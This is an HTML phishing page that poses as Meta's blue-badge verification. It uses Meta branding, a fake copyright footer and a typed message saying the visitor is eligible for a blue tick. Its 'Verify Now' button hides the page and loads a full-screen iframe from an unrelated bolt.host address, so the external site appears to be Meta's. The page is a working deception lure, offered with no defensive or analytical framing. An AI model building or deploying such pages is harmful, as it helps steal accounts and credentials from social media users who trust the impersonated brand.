<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Meta Blue Badge Access</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      background: #f5f6f7;
      font-family: "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
      color: #1c1e21;
      overflow: hidden;
    }

    .container {
      text-align: center;
      background: #fff;
      padding: 40px 35px;
      border-radius: 18px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
      max-width: 480px;
      width: 90%;
      animation: fadeIn 0.6s ease-out;
      z-index: 10;
      position: relative;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.97); }
      to { opacity: 1; transform: scale(1); }
    }

    .meta-logo {
      margin: 0 auto 20px;
      display: block;
      text-align: center;
    }

    /* Responsive image logo (mobile-first) */
    .meta-logo img {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      object-fit: cover;
      display: inline-block;
    }

    /* Slightly larger on tablets/desktop */
    @media (min-width: 600px) {
      .meta-logo img { width: 96px; height: 96px; }
    }

    .message-box {
      background: linear-gradient(145deg, #ffffff, #e9f0ff);
      border-radius: 14px;
      box-shadow: inset 0 1px 1px rgba(255,255,255,0.7),
                  0 4px 10px rgba(0,0,0,0.1);
      padding: 18px 22px;
      margin-top: 8px;
      margin-bottom: 25px;
    }

    .message {
      font-size: 18px;
      line-height: 1.7;
      font-weight: 600;
      white-space: pre-wrap;
      background: linear-gradient(90deg, #1877f2, #0099ff, #1877f2);
      background-size: 200% auto;
      background-clip: text;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: colorShift 3s linear infinite;
      text-shadow: 0px 2px 4px rgba(24,119,242,0.15);
    }

    @keyframes colorShift {
      to { background-position: 200% center; }
    }

    .verify-btn {
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 12px 30px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: 0.25s;
      box-shadow: 0 4px 10px rgba(24,119,242,0.25);
    }

    .verify-btn:hover {
      background: #1463d9;
      box-shadow: 0 6px 14px rgba(24,119,242,0.3);
    }

    .footer {
      margin-top: 25px;
      font-size: 13px;
      color: #65676b;
      text-align: center;
      animation: fadeIn 1s ease;
    }

    /* Intro video overlay */
    .intro-overlay {
      position: fixed;
      inset: 0;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999999;
    }

    .intro-overlay video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .intro-controls {
      position: absolute;
      right: 20px;
      top: 20px;
      z-index: 1000000;
    }

    .skip-btn {
      background: rgba(255,255,255,0.85);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- Intro video overlay: replace 'intro.mp4' with your video file path -->
  <div id="introOverlay" class="intro-overlay" aria-hidden="false">
    <video id="introVideo" autoplay muted playsinline preload="auto">
      <source src="bandicam.mp4" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <div class="intro-controls">
    </div>
  </div>
  <div class="container" id="mainContainer">
    <div class="meta-logo">
      <img src="Meta%20Verify.png" alt="Meta Verify" class="meta-img">
    </div>

    <div class="message-box">
      <div id="message" class="message"></div>
    </div>

    <button id="verifyBtn" class="verify-btn">Verify Now</button>
  </div>

  <div class="footer">© Meta Platforms, Inc.</div>

  <script>
    // Intro video handlers: hide overlay when video ends or user skips
    (function handleIntroVideo(){
      const introOverlay = document.getElementById('introOverlay');
      const introVideo = document.getElementById('introVideo');
      const skipBtn = document.getElementById('skipIntro');

      if (!introOverlay || !introVideo) return;

      function endIntro() {
        introOverlay.style.display = 'none';
        introOverlay.setAttribute('aria-hidden', 'true');
        try { document.body.style.overflow = ''; } catch(e) {}
      }

      // Attempt to play (some browsers block unless muted - video is muted)
      introVideo.play().catch(() => {});

      introVideo.addEventListener('ended', endIntro);
      if (skipBtn) skipBtn.addEventListener('click', () => { introVideo.pause(); endIntro(); });
    })();

    const TARGET_URL = "https://professional-social-bwfy.bolt.host";

    const messageText = `Congratulations! You are now eligible to receive the Meta blue tick.

Please complete the verification process to activate your badge.`;

    function typeWriterEffect(text, element, duration = 2500) {
      return new Promise(resolve => {
        const total = text.length;
        const speed = duration / total;
        let i = 0;
        const timer = setInterval(() => {
          element.textContent = text.slice(0, i + 1);
          i++;
          if (i === total) {
            clearInterval(timer);
            resolve();
          }
        }, speed);
      });
    }

    (function main() {
      const messageEl = document.getElementById("message");
      const verifyBtn = document.getElementById("verifyBtn");
      const mainContainer = document.getElementById("mainContainer");

      typeWriterEffect(messageText, messageEl, 2800);

      verifyBtn.addEventListener("click", () => {
        // Ẩn container và footer
        mainContainer.style.display = "none";
        document.querySelector(".footer").style.display = "none";

        // Tạo iframe full screen để load link đích
        const iframe = document.createElement("iframe");
        iframe.src = TARGET_URL;
        iframe.style.cssText = `
          position:fixed;
          top:0;
          left:0;
          width:100%;
          height:100%;
          border:none;
          margin:0;
          padding:0;
          overflow:hidden;
          z-index:999999;
        `;
        document.body.appendChild(iframe);
      });
    })();
  </script>
</body>
</html>
